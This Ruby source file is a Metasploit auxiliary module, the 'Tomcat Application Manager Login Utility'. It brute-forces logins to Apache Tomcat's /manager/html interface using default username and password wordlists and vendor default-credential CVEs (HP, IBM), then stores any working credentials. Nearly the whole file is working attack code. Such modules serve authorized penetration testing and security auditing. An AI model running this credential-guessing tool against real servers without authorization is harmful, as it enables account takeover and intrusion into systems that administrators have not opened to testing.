##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/tomcat'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Tomcat Application Manager Login Utility',
      'Description'    => 'This module simply attempts to login to a Tomcat Application Manager instance using a specific user/pass.',
      'References'     =>
        [
          # HP Default Operations Manager user/pass
          [ 'CVE', '2009-3843' ],
          [ 'OSVDB', '60317' ],
          [ 'BID', '37086' ],
          [ 'CVE', '2009-4189' ],
          [ 'OSVDB', '60670' ],
          [ 'URL', 'http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html' ],
          [ 'ZDI', '09-085' ],

          # HP Default Operations Dashboard user/pass
          [ 'CVE', '2009-4188' ],

          # IBM Cognos Express Default user/pass
          [ 'BID', '38084' ],
          [ 'CVE', '2010-0557' ],
          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179' ],

          # IBM Rational Quality Manager and Test Lab Manager
          [ 'CVE', '2010-4094' ],
          [ 'ZDI', '10-214' ],

          # 'admin' password is blank in default Windows installer
          [ 'CVE', '2009-3548' ],
          [ 'OSVDB', '60176' ],
          [ 'BID', '36954' ],

          # General
          [ 'URL', 'http://tomcat.apache.org/' ],
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'Author'         => [ 'MC', 'Matteo Cantoni <goony[at]nothink.org>', 'jduck' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('USERNAME', [false, 'The HTTP username to specify for authentication', '']),
        OptString.new('PASSWORD', [false, 'The HTTP password to specify for authentication', '']),
        OptString.new('TARGETURI', [true, "URI for Manager login. Default is /manager/html", "/manager/html"]),
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "tomcat_mgr_default_pass.txt") ]),
      ])

    deregister_options('PASSWORD_SPRAY')

    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888, 9080, 19300 ])
  end

  def run_host(ip)
    begin
      uri = normalize_uri(target_uri.path)
      res = send_request_cgi({
        'uri'     => uri,
        'method'  => 'GET',
        'username' => Rex::Text.rand_text_alpha(8)
        }, 25)
      http_fingerprint({ :response => res })
    rescue ::Rex::ConnectionError => e
      vprint_error("http://#{rhost}:#{rport}#{uri} - #{e}")
      return
    end

    if not res
      vprint_error("http://#{rhost}:#{rport}#{uri} - No response")
      return
    end
    if res.code != 401
      vprint_error("http://#{rhost}:#{rport} - Authorization not requested")
      return
    end

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS'],
    )

    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::Tomcat.new(
      configure_http_login_scanner(
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 10,
        http_username: datastore['HttpUsername'],
        http_password: datastore['HttpPassword']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id,
          private_type: :password
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        if result.proof
          vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
        else
          vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})"
        end
      end
    end
  end
end
